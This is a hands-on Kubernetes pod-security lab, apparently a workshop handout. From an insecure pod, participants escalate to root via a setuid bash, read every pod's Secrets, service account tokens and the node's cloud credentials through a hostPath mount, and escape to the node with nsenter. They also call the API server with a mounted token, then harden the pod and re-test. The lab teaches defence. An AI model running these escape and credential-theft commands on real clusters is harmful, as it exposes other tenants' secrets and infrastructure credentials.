# Pod Security


## The scenario

Your application has a vulnerability. An attacker sent a request that got them
command execution inside your container. That has already happened. This lab
starts the moment after.

We simulate that with `kubectl exec`. It is not the attack. It is the
starting line, exactly where a real attacker lands after exploiting a web app.

Every participant has a namespace with a Kubernetes Secret holding a unique
flag. Your `kubectl` credentials cannot read secrets, not even your own.
**Goal: collect as many other people's flags as you can, through the pod, not
with `kubectl`.**

**Rules:** read anything, destroy nothing. No rebooting, no killing
processes, no deleting or overwriting files on the node. Stay in your own
namespace with `kubectl`; everything else goes through the pod.


## Setup

1. Export the kubeconfig file your instructor gave you, replacing `sNN` with your actual filename (e.g. `s07`):
   `export KUBECONFIG=$PWD/out/sNN.kubeconfig`
   - This tells `kubectl` which cluster to talk to and which identity to use. Your instructor generated one file per participant, each scoped to its own namespace.
2. Confirm you can't read secrets:
   `kubectl get secrets`
   - Expect `Forbidden`. This proves your account has no path to any flag through `kubectl` directly, not even your own.
3. Deploy the target pod:
   `kubectl apply -f manifests/insecure-pod.yaml`
   - Creates the pod described in that file. Several of its settings are deliberately insecure, each one numbered in a comment.
4. Wait for it to start:
   `kubectl get pod app -w` (Ctrl-C once it says `Running`)
   - `-w` watches for changes instead of exiting immediately, so you see the pod move from `Pending` to `Running`.
5. Open `manifests/insecure-pod.yaml` in an editor and leave it open. Every comment in it is numbered to match a control below.


## Step 1: Recon, where am I?

1. Get a shell:
   `kubectl exec -it app -- bash`
   - Runs `bash` inside the container and attaches your terminal to it. Everything you type from here runs inside the container, not on your own machine.
2. Who am I:
   `id`
   - Expect `uid=1000(appuser)`. A normal user, not root.
3. Your own flag:
   `cat /etc/app-secret/flag.txt`
   - Reads a Secret that was mounted into the pod as a file. Note the value, you'll see it again later from somewhere unexpected.
4. The node's processes, not just yours:
   `ps -ef | head -20`
   - Normally a container only sees its own tiny process list, because Kubernetes gives each pod a private view of processes (a Linux PID namespace). This pod sets `hostPID: true`, meaning "show me the node's process list instead of my own." Look for `kubelet` in the output. That process runs the node itself, it was never part of your container.
5. The interesting directory:
   `ls /host/var/lib/kubelet/pods`
   - `/host` is the node's entire filesystem, mounted into your container. `/var/lib/kubelet/pods` is where Kubernetes stores every pod's files on that node, including Secrets. Expect `Permission denied` for now, the door exists, you're just not privileged enough to open it yet.

Nothing has escaped the container. You are still in the room.


## Step 2: Get root inside the container

*Controls 1, 2, 3*

1. `ls -la /usr/local/bin/vulnbash`
   - Lists the file's permissions. Normal permissions look like `rwxr-xr-x` (owner/group/other). Here you'll see `-rwsr-xr-x`: the owner's `x` is replaced with `s`. That's the **setuid bit**, it means whoever runs this file runs it as its *owner* (root), not as themselves. Real systems ship this same bit on `sudo`, `su`, `ping`, `mount` and `pkexec` for legitimate reasons; `vulnbash` stands in for all of them.
2. `/usr/local/bin/vulnbash -p`
   - Runs the setuid binary. `-p` tells bash not to drop the elevated privileges it just inherited; without it, bash would notice something's off and lower itself back down as a safety measure.
3. `id`
   - Expect `uid=1000(appuser) ... euid=0(root)`. The real UID stays 1000, `-p` only stops bash from dropping the effective UID it got from the setuid bit. The kernel checks the effective UID for permissions, so this shell already acts as root everywhere that matters. One command, no exploit needed.

Ask yourself: has anything escaped the container yet? No, you're root, but
still confined to the same restricted view as before. Root inside a
container isn't root on the node. Try the command that failed in step 1
again, it still fails.


## Step 3: Take the node's disk, take everyone's secrets

*Controls 4, 5, the main event*

Still root from step 2:

1. `ls /host/var/lib/kubelet/pods | head`
   - The same directory that said `Permission denied` in step 1. Now that you're root, the node's own permission checks let you straight through.
2. `ls /host/var/lib/kubelet/pods | wc -l`
   - Counts the entries. Each one is a different pod Kubernetes has scheduled onto this same node, including every other participant's pod.
3. `grep -rh LAB-FLAG /host/var/lib/kubelet/pods/ 2>/dev/null | sort -u`
   - Searches every pod's files on the node for the text `LAB-FLAG`, the prefix every participant's flag starts with. `-r` searches recursively, `-h` hides filenames from the output, `2>/dev/null` throws away "permission denied" noise from files you still can't read, and `sort -u` removes duplicates. Whatever prints out are real flags belonging to other participants.
4. `ls /host/var/lib/kubelet/pods/*/volumes/kubernetes.io~projected/*/token 2>/dev/null | head`
   - Kubernetes mounts each pod's service account token as a file under this exact path on the node. Listing it shows you have read access to every participant's Kubernetes credential, not just their flag.
5. `ls -la /host/etc/kubernetes/` and `head -20 /host/etc/kubernetes/azure.json 2>/dev/null`
   - `/etc/kubernetes` on the node holds the node's own configuration, including (on AKS) the cloud identity the node itself authenticates as. This is a level above another participant's pod, it's the infrastructure's own credentials.

Every flag you just read belongs to a Secret in a different Kubernetes
namespace, one your `kubectl` cannot touch (try `kubectl -n s03 get secret
flag` from another terminal: `Forbidden`). A Kubernetes namespace is a folder
in the API. A Linux namespace is what actually isolates a process. You walked
straight through the Kubernetes one because it only ever existed in a
database. `hostPath` gave you the node's real disk instead, and a disk does
not know what a Kubernetes namespace is.

**Nothing was exploited.** No CVE. Somebody wrote `hostPath: /` in a YAML file
and somebody else approved it. If this pod had been non-root with every
capability dropped and no privilege escalation, `/host` would *still* be
mounted: `hostPath` makes step 2 irrelevant on its own. `readOnly: true` would
not have helped either; every path above still reads fine read-only.


## Step 4: Get a shell on the node itself

*Control 6, skip if you're behind*

1. `nsenter -t 1 -m -u -i -n -p -- bash`
   - `nsenter` joins the namespaces of another process instead of creating your own. `-t 1` targets process ID 1: on the node, that's the node's own init process, not a process inside your container. The flags `-m -u -i -n -p` say which namespaces to join: mount, UTS (hostname), IPC, network and process. The result runs `bash` as if you were logged into the node directly. This only works because the pod has `hostPID: true` (so you can see process 1 on the node) and `privileged: true` (so you're allowed to join its namespaces at all).
2. `hostname`
   - Expect an AKS node name, not your pod's name. Confirms you're now looking at the node, not the container.
3. `ls /var/lib/kubelet/pods`
   - The same directory as step 3, but notice there's no `/host` prefix any more. There's no container filesystem left to prefix, you're really on the node now.
4. `crictl ps 2>/dev/null | head`
   - `crictl` talks to the node's container runtime directly. This lists every container running on the node, from every participant, the same view the node itself has.
5. `exit`
   - Leaves the node shell and drops you back into the container's own shell.


## Step 5: The credential you didn't know you shipped

*Control 7*

1. `ls -la /var/run/secrets/kubernetes.io/serviceaccount/`
   - Every pod gets this directory mounted automatically, whether it needs it or not. It contains a live Kubernetes API credential for the pod's own service account.
2. Use it:
```bash
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
CA=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt

curl -s --cacert $CA -H "Authorization: Bearer $TOKEN" \
  https://kubernetes.default.svc/api/v1/namespaces/$NS/secrets/flag \
  | jq -r '.data["flag.txt"]' | base64 -d; echo
```
   - `TOKEN` and `NS` read the credential and its namespace straight from those mounted files. `CA` points at the certificate needed to trust the Kubernetes API's HTTPS connection. `curl` then calls the Kubernetes API directly, as the pod's own identity, asking for the same Secret `kubectl` refused you at the start of the lab. `kubernetes.default.svc` is a DNS name that always points at the API server from inside the cluster. The response is JSON, so `jq` pulls out the flag field, and `base64 -d` decodes it, since Kubernetes stores Secret values base64-encoded.

This needed no root and no shell: a bug that reads one arbitrary file (an
SSRF, a path traversal, a log viewer with a filename parameter) is enough to
steal this same token and run the same `curl` command from outside the
cluster entirely.

**Stretch goal:** you collected other people's tokens in step 3. Use one,
same command, different `$TOKEN` and `$NS`.


## Step 6: Harden it

1. `exit`
   - Leaves the pod.
2. `diff manifests/insecure-pod.yaml manifests/hardened-pod.yaml`
   - Shows exactly what changed between the two files. Note what did **not** change: same image, same service account, same flag mounted at `/etc/app-secret`. Only the security settings moved.
3. `kubectl delete pod app`
   - Removes the insecure pod.
4. `kubectl apply -f manifests/hardened-pod.yaml`
   - Creates the same app again, this time with all seven controls in place.
5. `kubectl get pod app -w` (Ctrl-C once `Running`)


## Step 7: Try it all again

Before each command, predict what will happen.

```bash
kubectl exec -it app -- bash

id                                                        # ?
ps -ef                                                    # ?
/usr/local/bin/vulnbash -p; id                            # ?
ls /host                                                  # ?
nsenter -t 1 -m -u -i -n -p -- bash                       # ?
cat /var/run/secrets/kubernetes.io/serviceaccount/token   # ?
cat /etc/app-secret/flag.txt                              # ?
```

### Scorecard

| Attack | Result | Why |
|---|---|---|
| `id` | `uid=10001` | `runAsNonRoot` + `runAsUser`, kubelet verified it |
| `ps -ef` | 2 processes | own PID namespace, node invisible again |
| setuid to root | still `10001` | `allowPrivilegeEscalation: false` |
| `ls /host` | no such file | no `hostPath` in the manifest |
| `nsenter` | permission denied | no `privileged`, no capabilities, own PID namespace |
| read token | no such file | `automountServiceAccountToken: false` |
| **read own flag** | **works** | nothing was broken to achieve any of the above |

That last row is the one to remember: hardening the pod cost twelve lines of
YAML and broke nothing.


## The seven controls

| # | Control | YAML |
|---|---|---|
| **Inside the container** | | |
| 1 | Run as a non-root user | `runAsNonRoot: true`, `runAsUser: 10001` |
| 2 | Drop all capabilities | `capabilities: { drop: ["ALL"] }` |
| 3 | No privilege escalation | `allowPrivilegeEscalation: false` |
| **Out to the node** | | |
| 4 | No privileged containers | `privileged: false` |
| 5 | No host directories | no `hostPath` volumes |
| 6 | No host namespaces | `hostNetwork` / `hostPID` / `hostIPC`: `false` |
| **Out to the cluster** | | |
| 7 | No service account token | `automountServiceAccountToken: false` |
